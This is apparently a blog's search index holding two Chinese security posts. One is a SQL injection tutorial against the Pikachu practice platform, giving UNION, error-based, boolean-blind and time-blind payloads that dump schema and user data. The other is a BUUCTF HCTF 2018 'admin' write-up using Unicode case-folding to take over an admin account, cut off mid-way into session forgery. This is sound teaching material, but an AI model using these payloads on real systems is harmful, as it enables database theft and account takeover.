<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SQL-SQL注入基础</title>
    <url>/2021/SQL-SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="SQL-SQL注入基础"><a href="#SQL-SQL注入基础" class="headerlink" title="SQL-SQL注入基础"></a>SQL-SQL注入基础</h1><p>SQL注入即开发者对用户输入参数没有做到严格过滤，导致用户输入数据能够影响预设的查询功能</p>
<p>通常表现为数据库原有信息被泄露、篡改，甚至删除</p>
<h2 id="UNION注入-数字型注入"><a href="#UNION注入-数字型注入" class="headerlink" title="UNION注入-数字型注入"></a>UNION注入-数字型注入</h2><p>前提：用户通过传入的id等参数，可以从数据库中查询相应的记录</p>
<p>对字符型注入的判断：判断输入值有无数字运算的特征行为</p>
<p>例如：输入id=2与id=3-1得到的反馈是相同的，即该注入点为数字型注入</p>
<p>以<a class="link"   href="https://github.com/zhuifengshaonianhanlu/pikachu" >pikachu漏洞练习平台<i class="fas fa-external-link-alt"></i></a>上题目为例</p>
<p>SQL-Inject/数字型注入（post）</p>
<p>使用BURPSUITE修改post请求</p>
<p>id=3</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210313110834318.png"
                      alt="image-20210313110834318"
                ></p>
<p>id=5-2</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210313110842493.png"
                      alt="image-20210313110842493"
                ></p>
<p>可见id值为“3”与id值为“5-2”所得反馈相同</p>
<p>即该注入点为数字型注入</p>
<p>使用UNION并入SQL查询语句来干扰正常查询</p>
<p>在确定为数字型注入后，使用order by 1-99语句查询该数据表的字段数量</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>返回界面与id=1时相同</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>出现了错误</p>
<p>即在该环境中，通过order by查询得到的字段数为2</p>
<p>故union注入的语句如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>访问id=1 union select 1,2</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210313110854874.png"
                      alt="image-20210313110854874"
                ></p>
<p>既执行了id=1的查询，也执行了union后的查询</p>
<p>指定id=-1或一个很大的值，使其无法正常执行原查询，则会执行union后的查询</p>
<p>将union select 1,2中的1或2修改成需要的查询语句</p>
<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br><span class="line">或</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>database()函数用于查询当前数据库名，即可得到该数据库名为“pikachu“</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210313110905480.png"
                      alt="image-20210313110905480"
                ></p>
<p>之后可通过修改查询语句进行对数据库的查询</p>
<p>查询表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这里只显示第一项记录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210313110915339.png"
                      alt="image-20210313110915339"
                ></p>
<p>在原有数据后面加上”limit 1,1“参数即可显示第二条记录</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>”limit 1,1“即为条件限定，取查询结果第一条记录的后一条记录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210313110927858.png"
                      alt="image-20210313110927858"
                ></p>
<p>同理”limit 2,1“为限定查询结果第二条记录的后一条记录</p>
<p>同理”limit 0,100“为限定查询结果的前一百条记录</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span> limit <span class="number">0</span>,<span class="number">100</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210313110954946.png"
                      alt="image-20210313110954946"
                ></p>
<p>亦可使用”group_concat“来用”,“联合多行记录</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() #查询所有表名</span><br><span class="line">或</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span> #查询“pikachu”库下所有表名</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210313111006400.png"
                      alt="image-20210313111006400"
                ></p>
<p>继续查询所需要的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;member&#x27;</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> username,email <span class="keyword">from</span> <span class="keyword">member</span></span><br></pre></td></tr></table></figure>

<p>最后查询对应的”username“与”email“即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210313111016337.png"
                      alt="image-20210313111016337"
                ></p>
<h2 id="UNION注入-字符型注入"><a href="#UNION注入-字符型注入" class="headerlink" title="UNION注入-字符型注入"></a>UNION注入-字符型注入</h2><p>GET参数输入的地方包裹单引号，变成字符串</p>
<p>注入方式：尝试闭合前面单引号，且注释后面的语句</p>
<p>即：使用单引号闭合前面单引号，使用注释符号注释后面语句</p>
<p>常用注释：”#”、”/**/“、”–”</p>
<p>构造时应使用符号的url编码</p>
<p>空格：”%20“，”#“：”%23“，”‘“：”%27“</p>
<p>url中构造</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,group_concat(table_name)<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>information_schema.tables<span class="operator">%</span><span class="number">20</span><span class="keyword">where</span><span class="operator">%</span><span class="number">20</span>table_schema<span class="operator">=</span>database()<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210313111033127.png"
                      alt="image-20210313111033127"
                ></p>
<p>修改union后面的查询语句即可继续查询所需的内容</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>利用页面报错信息获取数据</p>
<p>常用于报错注入的函数：</p>
<blockquote>
<p>updatexml()： MySQL对XML文档数据进行查询和修改的XPATH函数</p>
<p>extractvalue()：MySQL对XML文档数据进行查询的XPATH函数</p>
<p>floor()：MySQL中用来取整的函数</p>
</blockquote>
<p>UPDATEXML (XML_document, XPath_string, new_value);</p>
<blockquote>
<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
<p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找<a class="link"   href="https://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html" >教程<i class="fas fa-external-link-alt"></i></a></p>
<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
<p>作用：改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值</p>
</blockquote>
<p>测试题：pikachu漏洞练习平台/数字型注入(post)</p>
<p>通过报错信息查询数据库名称</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210313111046816.png"
                      alt="image-20210313111046816"
                ></p>
<p>将database()函数替换为其他查询语句即可</p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>通过注入得到的真假回显推测出数据</p>
<p>测试环境：pikachu漏洞练习平台</p>
<p>添加”and“，”and“两边需同时满足查询才可执行</p>
<p>测试题：pikachu漏洞练习平台/数字型注入(post)</p>
<p>判断数据库名的长度</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">&gt;=</span><span class="number">7</span></span><br></pre></td></tr></table></figure>

<p>执行成功</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">&gt;=</span><span class="number">8</span></span><br></pre></td></tr></table></figure>

<p>不能执行</p>
<p>上文可知该数据库名为”pikachu“，为7位字符</p>
<p>判断数据库的名称</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span><span class="string">&#x27;a&#x27;</span></span><br></pre></td></tr></table></figure>

<p>执行成功</p>
<p>substr()函数功能为截取，“1,1”即截取database()中从第一个开始字符，返回一个字符，这点与limit不同</p>
<p>即可使用二分法去猜测字符</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span><span class="string">&#x27;p&#x27;</span></span><br></pre></td></tr></table></figure>

<p>执行成功</p>
<p>MySQL自带的截取函数：substring(),mid(),substr()</p>
<p>将database()函数换成其他查询语句，即可查询所需</p>
<p>如若改变测试题为：pikachu漏洞练习平台/字符型注入(get)</p>
<p>get型要注意url编码,而字符型需要构造闭合，且需要注释，故构造如下</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">20</span>length(database())<span class="operator">&gt;</span><span class="number">1</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>执行成功</p>
<p>其他具体查询就与前文类似</p>
<p>在数字型与字符型分别访问以下两个</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span> <span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">kobe<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">or</span><span class="operator">%</span><span class="number">201</span><span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>由于1=1是永真条件，页面定能执行，返回出来的东西还会有惊喜</p>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>某些情况下页面回显内容是完全一致的，可通过增加语句执行时需要等待的时间来判断查询是否为有效查询</p>
<p>测试题：pikachu漏洞练习平台/字符型注入(get)</p>
<p>访问</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">20</span>sleep(<span class="number">3</span>)<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>后台等待三秒才开始执行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210315224953921.png"
                      alt="image-20210315224953921"
                ></p>
<p>判断数据库名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kobe<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">20</span>if((substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="string">&#x27;p&#x27;</span>,sleep(<span class="number">3</span>),<span class="keyword">null</span>)<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>延迟了三秒，证明查询成功，数据库名第一个字母为“p”</p>
<p>可通过这种特性，查询所需内容，具体与布尔盲注类似</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>注入技巧使用优先级是：UNION注入&gt;报错注入&gt;布尔盲注&gt;时间盲注</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>基础学习</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-[HCTF 2018]admin</title>
    <url>/2021/BUUCTF-%5BHCTF%202018%5Dadmin/</url>
    <content><![CDATA[<h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><p>进入界面：</p>
<p>没注册的时候有”login”,”register”两个选项</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210104203729587-1549429743.png"
                      alt="img"
                ></p>
<p>随随便便就给它注册一个</p>
<p>诶，这回选择就多了</p>
<p>可以”index”,”post”,”change password”,”logout”</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img2020.cnblogs.com/blog/2256438/202101/2256438-20210104204528176-20660508.png"
                      alt="img"
                ></p>
<h2 id="几次尝试："><a href="#几次尝试：" class="headerlink" title="几次尝试："></a>几次尝试：</h2><h2 id="由提示”admin”入手"><a href="#由提示”admin”入手" class="headerlink" title="由提示”admin”入手"></a>由提示”admin”入手</h2><p>提示为admin</p>
<p>那我就乖乖地注册一个admin账户</p>
<p>哦吼，我滴乖乖</p>
<p>已经被注册了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210104205641929-1302366159.png"
                      alt="img"
                ></p>
<p>那说明什么，这个admin账户指定有点东西</p>
<p>首先想到的是使用BURPSUITE进行密码爆破</p>
<p>很显然，似乎是不能爆破，具体原因我不清楚，待大佬指点，记一坑，日后填</p>
<h2 id="依然由”admin”开始操作，改变大小写"><a href="#依然由”admin”开始操作，改变大小写" class="headerlink" title="依然由”admin”开始操作，改变大小写"></a>依然由”admin”开始操作，改变大小写</h2><p>注册”Admin”账户假装我是”admin”，以失败告终</p>
<h2 id="正确姿势"><a href="#正确姿势" class="headerlink" title="正确姿势"></a>正确姿势</h2><p>进行修改密码时，查看网页源代码</p>
<p>可以发现提供题目源码的地址</p>
<h3 id=""><a href="#" class="headerlink" title=""></a><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210105084655823-1561595359.png"
                      alt="img"
                ></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F;</span><br></pre></td></tr></table></figure>

<p>源码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, url_for, flash, request, redirect, session, make_response</span><br><span class="line"><span class="keyword">from</span> flask_login <span class="keyword">import</span> logout_user, LoginManager, current_user, login_user</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app, db</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> Config</span><br><span class="line"><span class="keyword">from</span> app.models <span class="keyword">import</span> User</span><br><span class="line"><span class="keyword">from</span> forms <span class="keyword">import</span> RegisterForm, LoginForm, NewpasswordForm</span><br><span class="line"><span class="keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="keyword">import</span> nodeprep</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> code <span class="keyword">import</span> get_verify_code</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/code&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span>():</span></span><br><span class="line">    image, code = get_verify_code()</span><br><span class="line">    <span class="comment"># 图片以二进制形式写入</span></span><br><span class="line">    buf = BytesIO()</span><br><span class="line">    image.save(buf, <span class="string">&#x27;jpeg&#x27;</span>)</span><br><span class="line">    buf_str = buf.getvalue()</span><br><span class="line">     <span class="comment"># 把buf_str作为response返回前端，并设置首部字段</span></span><br><span class="line">    response = make_response(buf_str)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/gif&#x27;</span></span><br><span class="line">    <span class="comment"># 将验证码字符串储存在session中</span></span><br><span class="line">    session[<span class="string">&#x27;image&#x27;</span>] = code</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, title = <span class="string">&#x27;hctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower():</span><br><span class="line">            flash(<span class="string">&#x27;Wrong verify code.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form=form)</span><br><span class="line">        <span class="keyword">if</span> User.query.filter_by(username = name).first():</span><br><span class="line">            flash(<span class="string">&#x27;The username has been registered&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        user = User(username=name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;register successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(form.password.data):</span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, title = <span class="string">&#x27;login&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">    logout_user()</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/change&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;change successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change.html&#x27;</span>, title = <span class="string">&#x27;change&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/edit&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        flash(<span class="string">&#x27;post successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;edit.html&#x27;</span>, title = <span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">error</span>):</span></span><br><span class="line">    title = unicode(error)</span><br><span class="line">    message = error.description</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;errors.html&#x27;</span>, title=title, message=message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>

<h2 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h2><p>观察源码</p>
<p>在末尾定义了一个函数 strlower() </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>

<p>这个函数在注册、登录、修改密码中都存在</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210105093221317-1756239823.png"
                      alt="img"
                ></p>
<p>函数主体中 username = nodeprep.prepare(username) </p>
<p>观察源码第十行 from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep </p>
<p>nodeprep是从Twisted模块导入</p>
<p>打开项目的requirements.txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Flask==<span class="number">0.10</span><span class="number">.1</span></span><br><span class="line">Werkzeug==<span class="number">0.10</span><span class="number">.4</span></span><br><span class="line">Flask_Login==<span class="number">0.4</span><span class="number">.1</span></span><br><span class="line">Twisted==<span class="number">10.2</span><span class="number">.0</span></span><br><span class="line">Flask_SQLAlchemy==<span class="number">2.0</span></span><br><span class="line">WTForms==<span class="number">2.2</span><span class="number">.1</span></span><br><span class="line"><span class="number">7</span> Flask_Migrate==<span class="number">2.2</span><span class="number">.1</span></span><br><span class="line"><span class="number">8</span> Flask_WTF==<span class="number">0.14</span><span class="number">.2</span></span><br><span class="line"><span class="number">9</span> Pillow==<span class="number">5.3</span><span class="number">.0</span></span><br><span class="line">pymysql==<span class="number">0.9</span><span class="number">.2</span></span><br></pre></td></tr></table></figure>

<p>其中 Twisted==10.2.0 </p>
<p>与官网的版本相比较，已是非常古老</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210105094647500-1384594145.png"
                      alt="img"
                ></p>
<p>利用古老版本的漏洞来作为这一题的突破口</p>
<p>而这里面就存在Unicode编码的一个问题</p>
<p>可以知道当使用了nodeprep.prepare()函数之后，如果我们先使用unicode的编码的字符，比如说 ᴬ ，使用该函数之后，他会先变成大写的A，再使用一次就会变成小写的a</p>
<p><a class="link"   href="https://unicode-table.com/en/search/?q=small+capital" >具体字符可查这<i class="fas fa-external-link-alt"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210105084228761-1283176198.png"
                      alt="img"
                ></p>
<p>下面是我自己使用python尝试了一下项目中的编译</p>
<p>其中Unicode编码 \u1d2c\u1d30\u1d39\u1d35\u1d3a 为”ᴬᴰᴹᴵᴺ”的unicode编码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210105102124568-1787164113.png"
                      alt="img"
                ></p>
<p>报错为 raise UnicodeError(“Unassigned code point %s” % repr(c)) 具体问题排查中</p>
<p>注册”ᴬᴰᴹᴵᴺ”账号</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210105084336491-932434290.png"
                      alt="img"
                ></p>
<p>登录进去，猛如虎一顿操作，改一个我的小脑袋瓜子能够记得住的密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210105084502114-575010068.png"
                      alt="img"
                ></p>
<p>退出该账号</p>
<p>通过”admin”进行登录</p>
<p>输入”ᴬᴰᴹᴵᴺ”账号的密码即可进入</p>
<p>悄咪咪地溜进去悄咪咪地拿到flag最后悄咪咪地走人</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/2256438-20210105103507585-346548518.png"
                      alt="img"
                ></p>
<h2 id="Session伪造"><a href="#Session伪造" class="headerlink" title="Session伪造"></a>Session伪造</h2><p>以下是来自学长的指点：</p>
<blockquote>
<p>服务器端是通过seesion区分用户的 </p>
<p>如果你解密你的seesion</p>
<p>然后添加管理员权限的标记 </p>
<p>再加密回去 </p>
<p>服务器就会认为你是admin</p>
</blockquote>
<p>这题的session是存在于本地</p>
<p>由资料中的<a class="link"   href="https://www.leavesongs.com/PENETRATION/client-session-security.html" >文章<i class="fas fa-external-link-alt"></i></a>知flask的session是存在客户端</p>
<p>随便注册一个账号”beacon”</p>
<p>登录进去，拿到session</p>
<p><img  
                     lazyload
